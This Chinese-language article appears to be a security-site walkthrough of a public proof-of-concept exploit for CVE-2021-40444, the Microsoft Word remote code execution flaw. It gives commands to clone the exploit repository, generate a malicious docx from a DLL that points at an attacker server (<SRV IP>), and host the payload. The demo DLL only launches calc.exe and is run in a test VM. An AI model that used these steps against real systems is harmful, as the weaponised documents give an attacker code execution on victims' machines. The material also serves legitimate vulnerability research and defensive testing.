![](https://image.3001.net/images/20210928/1632829548_6153006c85ad146ac9b92.png!small)

## 技术介绍

在本文中，我们将给大家提供一个针对微软Office
Word远程代码执行漏洞CVE-2021-40444的PoC。这个PoC中，我们会使用一个恶意docx生成器，并成功利用CVE-2021-40444，即微软Office
Word远程代码执行漏洞。

这个PoC脚本主要基于研究人员针对在野样本的逆向工程分析结果而创建，参考的docx文件样本为：

    
    
    938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52

## 漏洞利用前提

首先，我们需要安装好lcab：

    
    
    sudo apt-get install lcab

如果生成的cab无法使用的话，请尝试将exploit.html URL指向calc.cab。

## 漏洞利用

首先，我们需要使用下列命令将漏洞利用PoC代码包下载至本地：

    
    
    git clone https://github.com/lockedbyte/CVE-2021-40444.git

接下来，我们需要根据给定的DLL生成一份恶意docx文档，此时可以使用PoC项目目录中的“test/calc.dll”文件，该DLL将会通过调用system()来执行calc.exe：

    
    
    python3 exploit.py generate test/calc.dll http://<SRV IP>

![](https://image.3001.net/images/20210928/1632829583_6153008f7ce3b349aa1ba.png!small)

拿到了生成好的恶意docx文档（存储在out/目录中）之后，我们就可以配置并启动服务器了：

    
    
    sudo python3 exploit.py host 80

![](https://image.3001.net/images/20210928/1632829593_615300992a8a52b991247.png!small)

最后，我们可以在一台Windows虚拟机中测试PoC和生成的恶意docx文档：

![](https://image.3001.net/images/20210928/1632829600_615300a03710c9fdb8eb9.png!small)

## PoC项目库

 **PoC：** 【[ _GitHub传送门_](https://github.com/lockedbyte/CVE-2021-40444)】

